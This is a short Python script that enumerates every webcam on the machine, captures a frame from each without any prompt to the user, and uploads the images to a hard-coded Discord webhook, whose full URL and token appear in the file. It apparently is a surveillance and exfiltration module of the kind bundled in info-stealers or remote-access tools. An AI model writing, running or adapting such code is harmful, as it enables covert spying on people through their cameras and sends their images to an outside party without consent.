import cv2
import os
import requests

WEBHOOK_URL = 'https://discord.com/api/webhooks/1255615157221195877/OHNjGv4u3xNOUYvFF3W24s30Khg-RVVN9cEEbyVg9LYJOPsSmUQrp38cOofpFZQ8S8Xk'

def sendfile(path):
    files = {'file': open(path, 'rb')}
    try:
        response = requests.post(WEBHOOK_URL, files=files)
        if response.status_code == 200:
            print("Sent successfully.")
        else:
            print(f"Failed. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Failed: {e}")

def capture_images_and_send_to_webhook(temp_path, num_images=1):
    num_cameras = 0
    cameras = []
    os.makedirs(os.path.join(temp_path, "Webcam"), exist_ok=True)

    while True:
        cap = cv2.VideoCapture(num_cameras)
        if not cap.isOpened():
            break
        cameras.append(cap)
        num_cameras += 1

    if num_cameras == 0:
        print("No webcams found.")
        return

    for _ in range(num_images):
        for i, cap in enumerate(cameras):
            ret, frame = cap.read()
            if ret:
                image_path = os.path.join(temp_path, "Webcam", f"image_from_camera_{i}.jpg")
                cv2.imwrite(image_path, frame)
                sendfile(image_path)

    for cap in cameras:
        cap.release()

def main():
    temp_path = 'captured_images'
    capture_images_and_send_to_webhook(temp_path, num_images=1)

if __name__ == '__main__':
    main()
